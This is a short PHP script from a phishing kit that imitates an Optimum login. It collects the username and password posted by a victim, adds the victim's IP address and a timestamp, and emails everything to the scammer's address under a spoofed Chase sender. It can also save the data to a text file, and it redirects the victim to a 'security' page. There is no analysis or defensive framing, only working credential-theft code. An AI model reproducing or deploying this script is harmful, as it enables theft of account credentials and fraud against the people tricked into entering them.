<?php
$host = bin2hex ($_SERVER['HTTP_HOST']);
include('../../jok.php');
$ip = getenv("REMOTE_ADDR");
$message .= "------------[ -".$scamname."-optimum Access Info ]-------------\n";
$message .= "user        : ".$_POST['loginPageUsername']."\n";
$message .= "Bass        : ".$_POST['loginPagePassword']."\n";
$message .= "------------[ VECTIM PC/INFO ]-------------\n";
$message .= "IP			 : $ip\n";
$message .= "TIME		 : ".date("d/m/Y h:i:sa")." GMT\r\n";
$message .= "---------Created by -".$scamname."---------------\n";
$subject = "OPT ERROR - $ip";
$headers = "From: Chase Email <Chaseopt>";
if ($saveintext=="yes") {
	$save=fopen("../".$filename.".txt","a+");
	fwrite($save,$message);
	fclose($save);
	}
mail($recipient,$subject,$message,$headers);
header("Location:../../security");
?>